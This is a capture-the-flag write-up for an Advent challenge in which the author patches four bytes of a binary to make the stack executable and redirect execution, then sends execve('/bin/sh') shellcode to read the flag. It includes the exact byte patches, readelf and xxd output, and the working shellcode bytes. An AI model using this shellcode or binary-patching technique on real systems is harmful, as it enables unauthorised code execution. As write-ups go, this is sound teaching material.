# Day 6 - Genetic Mutation - pwn, misc

> We just rescued an elf that was captured by The Grinch for his cruel genetic experiments. But we were late, the poor elf was already mutated. Could you help us restore the elf's genes?

Service: nc 3.93.128.89 1206

## Initial Analysis

Connecting to the service we're given the following text:

```
$ nc 3.93.128.89 1206
We just rescued an elf that was captured by The Grinch
for his cruel genetic experiments.

But we were late, the poor elf was already mutated.
Could you help us restore the elf's genes?

Here is the elf's current DNA, zlib compressed and
then hex encoded:
==================================================
78daed597d6c14c7159fddf3d977c63e1fc4800da42c14abd0e0c52660cc57f19dbfd6d1d9b86027218959af7d6bdf29f761eded051b55099501f5044e911a55fc93c851850a6ad5baff51a40a535728fdf803da546dd3b4a255a01088ea8886d234f83ab33bb3de99dbc5a46aff63a4dbb7f39bf7debc997933f7e6ed6bad91369ee300291ef015806a75c566bd09e353d5160bc41a811f3e9f04ab00622bb2f1b1f43e47539fd58f29d7c89b7596ae0234e56cd40bdccb68294d01102c3964eb64b9894e960b141dc1fd8ef2b41c8fe5a6b0dc14e62774161b36cb8caf08ff7ab03e96b6009a1661da7d5d8fa277c18fad60e82e405322f75528570c1ebd0431dd87fb739b977e6c2fa1641d3625e2030d5b3625a2b589782a3b5a3bdad850dbb045cca4c5cd864d41ccdbded56bad376fb3b91263a8fdbd6fdf78a5f3dc991767e4d8f2938dab7fd97d23ddcd61790e7cbed26fad1c5d9e84bf250ef85a17bcc105ff9a8bfe452efc552ef809173d5fc236151438df83687a1b802c8f68f1943e240fc65e06ea685c0723593d03345589c2b6c151451e8aa79444fcb00aab484ccee88aa6cb49259e02ed918e70b3bc597c5adc62bd6f16b702b9a3a7538eaa9a3a1ccfe8aad6d3d99c48a7d41e652081b40c27d329ac4536591d19f18ee18d95f6184fdedab7bcb196c4eff4eab81ff14818cbae40751ef400da0fc97eaa2b31e959069fc54eef0bd238a9ffbec2a4c58c2f5db3e14536fca60db79f33b336dc67c3efdb70bf0d3f8ff112db1ca0326dc33d36fc1d1b6edfc7576c78890d97c6eff8a413de9a520148c7a6753e7f451aff996f06e4b7feda2f807ccdbbf059b1ba09bea17a0c89dcba9687a5e617a88ea6e2d615a3fe53544726de9a36ea17501d99766bcaa823f9a153a4dffa8f3a72570f4ab9bf4ae31fcc76f74426bca550569a28ff1687c8ee1b9027bff43894f947c5ea16033a072bbdd284f76d48a5edf7a5dc75bd1a9afe82df34bdbc2f7f6d48ac587dd4d0df3783ac9eaf43f938629cd83a60a8d93007e5a54b731e29372b5dbab947e22e4b57e7f42aa8700d56588614bae93bb2bb1ab281ec26697cf73f7df0ad17d953269dd8fd29acdd2c8723be29c1c765efc7b0ce21f12348eeeecc90311ec4de776b0872847a433dbdfba5afdf390d9ba3d289a29af5c8dedcd175df40f3342de5fef663e4d977a5efc1417c867c2b3d97cf43f9c844f23529773b947b3fb4e1ce05ce90faf345c3fbfa20c7919da5fa22697c868b6cbf9d7defb6af73f083f0e5a275004dfac4d6df40b68b48e6bc21b00ba99cd87d1dbd07e1bba9a601be99f6869e0b3ddb91fb1d32363251f303afb114b588ee0fe51e74e4ee45365c377ce9d203cfcdef3e80ca8e7da40bf57f24f315c97d1ac9dd6bc9fd3d94af7c1f19256dff53f643e46b2ff6855e0af5850e86e49953f3f37b7706fba6e18de6be37d6514d24d2821e8327cc46e1504cd1857846184b673521a524d53da05d53553d9e1ace0835998d4242d585a42a642080980445c8a453c33be07ffa73aa70289e8961b453d5b431a1391683675152c9943ab76aa87594694d50ad50564945a18ca48cbc302674a9878403aaa2ad01dc4acfce5d2406f82c9f476b0be0344da1730bd2e7215d0167fb1db4b721bd8fce2ae81d4df8b0a924e7dfe17d801b0d722bcb4a7ca7b89260258e6d90cea76cfbda991f8075985f80fcdd8821106c0b543d53b1e890ef08d8b362e7979f5eb796c8a39842827cf6736a23fcbd047fcf409b2711100e0427f870a0eaa42714108e178502ebc7bded8169ce16979c446382fc2ae6ff26e27fddd31a10268ac281f527bd52a0ee78b114681c2fe90c346981c650a00eea090704c807f9c3019f71b6bf8b5c12eae1c1e3f2b83c2e9fa790b887c4391c731f2a23f1060e5670180f7af0e6af66e2a99580bea7ac00745cb58a69ff642e9f46f434debc24263a8b831712ab9cc7ede4da75c6161793381895a5ccf8480c3459317fdf2271bcfd3c24b1cf724c9ff7d2f8e922daee694cfd4cff5f60c6f7efbc393e0e4373b81ec3faf2f3ede63ae07a176eff17ae7bfe4feb4fee996cb981c77f0fd362bc10cb8affbb7e48bcdcdedcbc4358df3b904de959619bb845acabadcf1ab5fa57eb1bc5ba2d62fd06135f58a707ce5a23ef84f3d63d98c63d4077c48b2cffa371afe577345e6cf9278d9758eb46e33e6bbd69dc6ff9158d975afe47e38bac7d48e365e08a235e0e8462273c60e55f68bcc2dad7341e04fd8ef8622b6f40e34b40bf23fe84754ed078a5753ed0f85247fff48065d67ea671b87b834e7815083ae2d5051867dcd73eceb37899717604403f336f018c4f32f81a8ccf32f836a38f797bc8be6f33de0be72189f5d495d07ac60cfec2f93ced62bfdbb8de32da9600bdb470bd9cf8bf6f3c9f28b0f327869ec2f5ba8cf9593bff603c0bfde78ea1a7707d790ee53902a0db07a8737c09e79ce7386ce085fe2072cef912144f07213feb2765067fe1be6877d173c0051fc5fa597b8eb9d8ff06c417f3cbad739394b7116edb8fe4f898c2f3730dfb894afe378dfc4715a862f4bc8af9c93940ee08d39cc9cfcec3af30ff0eac7f12e3575dc67bdb057f80c7c5eaf7f3cef3f045de395f75c1d0ef701e0e6a7a46cf0e0d8983603edd24eb497910e591324096a3697938911e501272544f6b1959c98e82c17472045e0ad5a8b8ad61fb36672694f68acb8aa62963b29ad2b53130a4c1bba51ccd26936350c4569321a74eb1aa0964912cb7ed0b75b6caad5d2d28d145b34581dc72a02bd4d9d14cb718793108b577f5caad12d620b5ec03727b646f381491f7b6b5ed6fed917b42e148ab4c72728399ac61f043336f28b1d7d444e5e9d4a8a22b46b28f6960537d6c3392b36ca5137a7234939663f0028c927d1d7b6143349e92b319356ab7160d19d6073219acc64828dab391f35da2f4224a4db246c0d191c975cd22d2394c5a03103363495d198054d74c1a236fd00a551b01622aadab6228dc51ab2bc3b8369cca8a03d978225a1b8f02a3165332312046c752509f4975cd6c7945d532f1748aaac8b04d53130a62c46f23091d7509a704bd8ac369f8a2aba3f069acaaa8a58d8512d51876bc58549baf99a2a6039912e41df6a024e383f0c51087b30d44e8fd49e8a6ff8b787225feaf21e7b3db7717c0dc33acfdcee434d9ef1a42c17f145dea197912ef11ba6e01799497b807636e224fe2c2d38cfd5e26ce27a50bdf4978e6de42e82c0054bed8c7dc1f9e65be65903893d0330bccdf417ca720f2241e25b492b19f67e8cbf88e42ea246e25b4cec57eeb7f17cf29cfdc9b089d76993f32fea3583eccdcc308edb7c92f73907fddf62dce7e6f2574f902eb9f63e4495c4d68b7cb772e42df60e449fc4d283b5f3e86bec9c893ff6742d7f2cefd93f21d469ec42d84fa1718ff3966ff923883d06917fb49f91123eff67dd1adff8b6cff7e9a56710fefffe73826f700f67be3a3cdff6fe1afc2264fe2dcb38f28ff173cf71ec07ecfa5bfe3163372415bfcce39e42d262b68ff77ebff4346de8a3783cefec28e671663449ec469c1a0333f7bfe7c8231f6fa4ee49f7291b753a73c6e5390de072bb12e76fffb5d722523cb4cba877fb8fd8b5de47f883b985b60fcff011d63bdbd
==================================================

You may mutate up to 4 bytes of the elf.
How many bytes to mutate (0 - 4)? 0
Alright - let's see what the elf has to say.
==================================================

Hello there, what is your name?
Greetings , let me sing you a song:
We wish you a Merry Chhistmas
We wish you a Merry Christmxs
We wish you alMerry Christmas
and a HapZy New Year!
```

Its clear that this is going to be a reversing / pwn challenge, so given the text above, I pulled out the hex encoded data, unzipped it, and pulled it up in Ghidra. The main function for this binary is fairly simple and obviously matches the output above. Quite simply, it reads in a string, and then calls `printf` and `puts`. This is shown below.

![main](./images/day6_genetic_mutation.md)

## Binary Modification

Since we get the ability to write any string we want into the program and the ultimate goal is to execute our own shellcode then we'll write the shellcode to that string. Next, we need to execute that string, so once the string is loaded into register `rdx` at address 0x001007ab, we'll just add an instruction at `rdx`. Finally, since this code will be on the stack, we'll need to modify the program so the stack is executable.

To do the latter, I took a look at the program headers from the binary and matched them up with the binary contents:

```
root@cccf37c4f618:/day6# readelf -l elf1_orig.bin 

Elf file type is DYN (Shared object file)
Entry point 0x630
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000001f8 0x00000000000001f8  R      0x8
  INTERP         0x0000000000000238 0x0000000000000238 0x0000000000000238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000a78 0x0000000000000a78  R E    0x200000
  LOAD           0x0000000000000da0 0x0000000000200da0 0x0000000000200da0
                 0x0000000000000270 0x0000000000000278  RW     0x200000
  DYNAMIC        0x0000000000000db0 0x0000000000200db0 0x0000000000200db0
                 0x00000000000001f0 0x00000000000001f0  RW     0x8
  NOTE           0x0000000000000254 0x0000000000000254 0x0000000000000254
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000000920 0x0000000000000920 0x0000000000000920
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000000da0 0x0000000000200da0 0x0000000000200da0
                 0x0000000000000260 0x0000000000000260  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .dynamic .got .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .dynamic .got 
root@cccf37c4f618:/day6# xxd elf1_orig.bin 
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 3006 0000 0000 0000  ..>.....0.......
00000020: 4000 0000 0000 0000 b019 0000 0000 0000  @...............
00000030: 0000 0000 4000 3800 0900 4000 1d00 1c00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
00000060: f801 0000 0000 0000 f801 0000 0000 0000  ................
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: 3802 0000 0000 0000 3802 0000 0000 0000  8.......8.......
00000090: 3802 0000 0000 0000 1c00 0000 0000 0000  8...............
000000a0: 1c00 0000 0000 0000 0100 0000 0000 0000  ................
000000b0: 0100 0000 0500 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 780a 0000 0000 0000 780a 0000 0000 0000  x.......x.......
000000e0: 0000 2000 0000 0000 0100 0000 0600 0000  .. .............
000000f0: a00d 0000 0000 0000 a00d 2000 0000 0000  .......... .....
00000100: a00d 2000 0000 0000 7002 0000 0000 0000  .. .....p.......
00000110: 7802 0000 0000 0000 0000 2000 0000 0000  x......... .....
00000120: 0200 0000 0600 0000 b00d 0000 0000 0000  ................
00000130: b00d 2000 0000 0000 b00d 2000 0000 0000  .. ....... .....
00000140: f001 0000 0000 0000 f001 0000 0000 0000  ................
00000150: 0800 0000 0000 0000 0400 0000 0400 0000  ................
00000160: 5402 0000 0000 0000 5402 0000 0000 0000  T.......T.......
00000170: 5402 0000 0000 0000 4400 0000 0000 0000  T.......D.......
00000180: 4400 0000 0000 0000 0400 0000 0000 0000  D...............
00000190: 50e5 7464 0400 0000 2009 0000 0000 0000  P.td.... .......
000001a0: 2009 0000 0000 0000 2009 0000 0000 0000   ....... .......
000001b0: 3c00 0000 0000 0000 3c00 0000 0000 0000  <.......<.......
000001c0: 0400 0000 0000 0000 51e5 7464 0600 0000  ........Q.td....
000001d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001f0: 0000 0000 0000 0000 1000 0000 0000 0000  ................
00000200: 52e5 7464 0400 0000 a00d 0000 0000 0000  R.td............
00000210: a00d 2000 0000 0000 a00d 2000 0000 0000  .. ....... .....
00000220: 6002 0000 0000 0000 6002 0000 0000 0000  `.......`.......
00000230: 0100 0000 0000 0000 2f6c 6962 3634 2f6c  ......../lib64/l
00000240: 642d 6c69 6e75 782d 7838 362d 3634 2e73  d-linux-x86-64.s
00000250: 6f2e 3200 0400 0000 1000 0000 0100 0000  o.2.............
<snip>
```

Its not entirely obvious, but the program header for the `GNU_STACK` can be found in the dump with the "RW" flags byte at offset 0x1cc (0x6 for RW). Setting this byte to 0x7 should make our stack executable.

Now putting this all together, I wrote up a [python script](./solutions/day6_solver.py) to set those bytes and then send my shellcode. This gives us the flag as shown below:

```
$ ./solver.py 
shellcode: b'1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05'
b'We just rescued an elf that was captured by The Grinch'
We just rescued an elf that was captured by The Grinch

<snip>

You may mutate up to 4 bytes of the elf.
How many bytes to mutate (0 - 4)? 
>> b'3\n'
b'Which byte to mutate? '
Which byte to mutate? 
>> b'460\n'
b'What to set the byte to? '
What to set the byte to? 
>> b'7\n'
b'Which byte to mutate? '
Which byte to mutate? 
>> b'1966\n'
b'What to set the byte to? '
What to set the byte to? 
>> b'255\n'
b'Which byte to mutate? '
Which byte to mutate? 
>> b'1967\n'
b'What to set the byte to? '
What to set the byte to? 
>> b'226\n'
b"Alright - let's see what the elf has to say."
Alright - let's see what the elf has to say.
b"Alright - let's see what the elf has to say.\n==================================================\n"
Alright - let's see what the elf has to say.
==================================================

>> b'1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05\n'
>> b'cat flag.txt\n'
b'AOTW{turn1NG_an_3lf_int0_a_M0nst3r?}'
AOTW{turn1NG_an_3lf_int0_a_M0nst3r?}
```
